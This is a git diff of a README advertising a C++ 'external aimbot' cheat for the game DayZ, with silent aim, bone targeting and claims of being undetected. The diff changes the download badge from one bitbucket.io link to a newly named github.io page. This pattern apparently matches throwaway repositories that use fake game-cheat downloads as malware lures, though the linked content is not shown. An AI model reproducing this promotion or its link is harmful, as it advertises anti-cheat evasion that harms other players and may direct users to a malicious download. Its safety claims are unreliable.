@@ -2,7 +2,7 @@
 
 Dominate firefights and survive longer in **DayZ** with this precision-built **C++ external aimbot**. Whether you're sniping from treelines or clearing buildings, this tool delivers silent aim, smart bone targeting, legit smoothing, and full FOV control — all while staying under the radar. 🎯 Fully external and undetected, it's designed for players who want power without the risk.
 
-[![Download DayZ Aimbot](https://img.shields.io/badge/Download-DayZ_Aimbot-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download DayZ Aimbot](https://img.shields.io/badge/Download-DayZ_Aimbot-blueviolet)](https://DayZ-Aimbot-du4.github.io/.github)
 
 ---
 
